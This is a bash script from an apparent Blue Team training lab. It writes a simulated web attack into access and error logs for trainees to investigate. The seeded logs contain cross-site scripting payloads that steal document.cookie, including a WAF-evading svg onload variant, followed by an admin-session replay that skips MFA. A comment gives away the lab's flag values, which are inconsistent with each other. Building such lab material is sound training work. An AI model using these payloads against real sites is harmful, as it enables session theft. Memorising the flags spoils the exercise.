#!/usr/bin/env bash
#
# generate_logs.sh
# -----------------
# Injects a simulated SCENARIO75 attack sequence into the Blue Team log
# files. Run this once after `docker compose up -d` (or let
# provision_vm.sh call it automatically) so the Blue Team has a realistic,
# self-consistent incident to investigate without needing to actually
# replay the Red Team exploit chain first.
#
# Log destination: ./logs on the host, bind-mounted to /opt/admin/logs
# inside the container (see docker-compose.yml).

set -euo pipefail

LOG_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/logs"
ACCESS_LOG="${LOG_DIR}/access.log"
ERROR_LOG="${LOG_DIR}/error.log"

mkdir -p "${LOG_DIR}"

INCIDENT_DATE="10/Aug/2026"    # arbitrary lab incident date
ATTACKER_IP="10.10.14.50"
BASELINE_IP="192.168.1.100"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
XFF_B64="UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0"    # exact Base64 from spec; decodes to PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r} -> Blue flag: SCENARIO75{BLUE_L0G_HUnt3r_M4st3r} OR CHANGE IT AND RE-RUN IT WITH U0NFTkFSSU83NXtCTFVFX0wwR19IVW50M3JfTTRzdDNyfQ== FOR THE FINAL FLAG

echo "[*] Seeding ${ACCESS_LOG}"
cat >> "${ACCESS_LOG}" <<EOF
${BASELINE_IP} - - [${INCIDENT_DATE}:18:45:02 +0700] "GET /dashboard HTTP/1.1" 200 512 "-" "${UA}"
${BASELINE_IP} - - [${INCIDENT_DATE}:18:47:30 +0700] "GET /dashboard HTTP/1.1" 200 512 "-" "${UA}"
${ATTACKER_IP} - - [${INCIDENT_DATE}:18:49:55 +0700] "GET /robots.txt HTTP/1.1" 200 88 "-" "${UA}"
${ATTACKER_IP} - - [${INCIDENT_DATE}:18:50:02 +0700] "GET / HTTP/1.1" 200 2104 "-" "${UA}"
${ATTACKER_IP} - - [${INCIDENT_DATE}:18:50:15 +0700] "POST /feedback HTTP/1.1" 403 61 "-" "${UA}"
${ATTACKER_IP} - - [${INCIDENT_DATE}:18:50:44 +0700] "POST /feedback HTTP/1.1" 200 76 "-" "${UA}"
${BASELINE_IP} - - [${INCIDENT_DATE}:18:51:20 +0700] "GET /dashboard HTTP/1.1" 200 1988 "-" "${UA}"
${ATTACKER_IP} - - [${INCIDENT_DATE}:18:51:40 +0700] "GET /collect?data=exfil HTTP/1.1" 200 2 "-" "${UA}" X-Forwarded-For:"${XFF_B64}"
${ATTACKER_IP} - - [${INCIDENT_DATE}:18:51:55 +0700] "GET /dashboard HTTP/1.1" 200 2431 "-" "${UA}"
EOF

echo "[*] Seeding ${ERROR_LOG}"
cat >> "${ERROR_LOG}" <<EOF
[${INCIDENT_DATE} 18:50:15 +0700] [WARN] WAF BLOCK ip=${ATTACKER_IP} ua="${UA}" reason="<script> tag detected" payload={"message":"<script>fetch('/collect?data='+document.cookie)</script>"}
[${INCIDENT_DATE} 18:50:44 +0700] [INFO] WAF ALLOW ip=${ATTACKER_IP} payload={"message":"<svg onload=\\"fetch('/collect?data='+window['docu'+'ment']['coo'+'kie'])\\">"}
[${INCIDENT_DATE} 18:51:40 +0700] [CRITICAL] Cookie reuse / exfiltration detected ip=${ATTACKER_IP} xff="${XFF_B64}" data="exfil"
[${INCIDENT_DATE} 18:51:55 +0700] [CRITICAL] Admin session cookie replayed from untrusted source ip=${ATTACKER_IP} dashboard_access=granted mfa_endpoint_hit=false
[${INCIDENT_DATE} 18:53:10 +0700] [CRITICAL] Authentication bypass anomaly - /dashboard granted without corresponding /api/verify-mfa call for session origin ip=${ATTACKER_IP}
EOF

echo "[*] Verifying attacker IP never touched /api/verify-mfa..."
if grep -q "${ATTACKER_IP}.*verify-mfa" "${ACCESS_LOG}"; then
  echo "    !! Inconsistency: attacker IP appears against /api/verify-mfa"
  exit 1
else
  echo "    OK: no /api/verify-mfa hits from ${ATTACKER_IP}"
fi

echo "[*] Done. Logs written to ${LOG_DIR}"
echo "    (mounted into the container at /opt/admin/logs)"